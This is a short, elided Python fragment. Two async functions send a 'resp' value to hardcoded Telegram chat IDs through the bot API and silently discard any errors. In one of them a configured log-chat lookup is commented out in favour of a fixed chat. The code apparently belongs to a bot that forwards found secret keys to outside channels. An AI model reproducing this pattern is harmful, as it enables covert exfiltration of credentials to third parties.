...
# Function to get the proxy format and return proxies
...
#     proxy_ip = requests.get(url, proxies=proxies, timeout=10)
...
async def sendsk(resp, session):
    try:
        ...
        await session.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id=-4217994240&text={resp}&parse_mode=HTML")
    except:
        pass
...
async def adminsk(resp, session):
    try:
        ...
        # LOGS_CHAT = json.loads(
        #     open("FILES/config.json", "r", encoding="utf-8").read())["LOGS_CHAT"]
        await session.get(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id=-4257714063&text={resp}&parse_mode=HTML")
    except:
        pass
